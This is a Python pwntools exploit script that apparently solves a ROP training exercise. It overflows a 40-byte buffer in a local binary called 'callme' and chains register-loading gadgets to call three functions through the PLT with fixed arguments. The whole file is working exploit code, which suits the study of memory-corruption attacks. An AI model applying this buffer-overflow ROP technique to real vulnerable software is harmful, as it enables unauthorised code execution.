from pwn import *


elf = ELF("./callme")
rop = ROP("./callme")
p = process("./callme")

PLTcallme1 = elf.plt["callme_one"]
PLTcallme2 = elf.plt["callme_two"]
PLTcallme3 = elf.plt["callme_three"]

POPrdi = rop.rdi[0]
POPrsi = rop.rsi[0]
POPrdx = rop.rdx[0]
POPret = 0x4006BE

arg1 = 0xDEADBEEFDEADBEEF
arg2 = 0xCAFEBABECAFEBABE
arg3 = 0xD00DF00DD00DF00D

offset = 40
payload = b"0" * offset
payload += p64(POPret)
payload += p64(POPrdi)
payload += p64(arg1)
payload += p64(POPrsi)
payload += p64(arg2)
payload += p64(POPrdx)
payload += p64(arg3)
payload += p64(PLTcallme1)
payload += p64(POPrdi)
payload += p64(arg1)
payload += p64(POPrsi)
payload += p64(arg2)
payload += p64(POPrdx)
payload += p64(arg3)
payload += p64(PLTcallme2)
payload += p64(POPrdi)
payload += p64(arg1)
payload += p64(POPrsi)
payload += p64(arg2)
payload += p64(POPrdx)
payload += p64(arg3)
payload += p64(PLTcallme3)

p.sendlineafter(b"> ", payload)

out = p.recvall()

print(out)
